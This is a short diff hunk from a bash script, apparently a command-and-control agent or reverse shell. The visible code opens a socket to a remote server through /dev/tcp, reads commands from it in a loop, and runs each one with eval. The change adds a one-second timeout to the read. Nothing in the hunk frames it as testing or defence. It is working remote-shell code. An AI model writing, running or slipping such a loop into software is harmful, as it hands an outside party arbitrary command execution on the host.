@@ -10,7 +10,7 @@ JITTER=2
 while true; do
         # Open socket
         exec 5<>/dev/tcp/$SERVER_IP/$SERVER_PORT
-        while IFS= read -r command <&5; do
+        while IFS= read -r -t 1 command <&5; do
                 echo "HERE2"
                 echo $command
                 output=$(eval "$command" 2>&1 &)
